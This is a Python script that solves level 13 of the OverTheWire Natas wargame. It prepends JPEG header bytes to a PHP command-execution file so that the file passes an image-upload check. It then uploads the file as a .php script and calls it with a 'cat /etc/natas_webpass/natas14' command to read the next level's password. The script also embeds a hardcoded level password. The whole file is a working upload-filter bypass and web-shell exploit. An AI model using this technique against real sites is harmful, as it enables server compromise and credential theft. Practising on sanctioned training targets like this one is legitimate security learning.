import requests
import re
import os

# Define the bytes of a JPEG header
b = "ffd8ff"
bytes_ = b.encode("utf-8").fromhex(b)

# Check if the "add_header_jpeg.php" file exists
if not os.path.exists("add_header_jpeg.php"):
    # Open and read the "command_exec.php" file
    with open("command_exec.php", "rb") as f:
        content = f.read()
    # Create the "add_header_jpeg.php" file with the JPEG header
    with open("add_header_jpeg.php", "wb") as f:
        f.write(bytes_)
        f.write(content)

# Define the credentials, URL, and send a GET request to the target website
username = "natas13"
password = "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9"
url = "http://natas13.natas.labs.overthewire.org"

r1 = requests.get(url, auth=(username, password))

# Define the payload and files to be sent in a POST request
payload = {"MAX_FILE_SIZE": "1000", "filename": "add_header.php"}
files = {"uploadedfile": open("add_header_jpeg.php", "rb")}

# Send a POST request to the target website with the defined payload and files
r2 = requests.post(url, auth=(username, password), data=payload, files=files)

# Extract the directory name from the response using regular expressions
content = r2.text
pattern = r"upload/[A-Za-z0-9]+"
replacement = ".php"
directory_name = "/" + re.search(pattern + replacement, content).group()

# Construct the URL path with the directory name and a command to retrieve the password for the next level
url_path = url + directory_name + "?c=cat%20/etc/natas_webpass/natas14"

# Send a GET request to the URL path and print the password for the next level
r3 = requests.get(url_path, auth=(username, password))

print("Password to level 14:", r3.text[4:].strip())
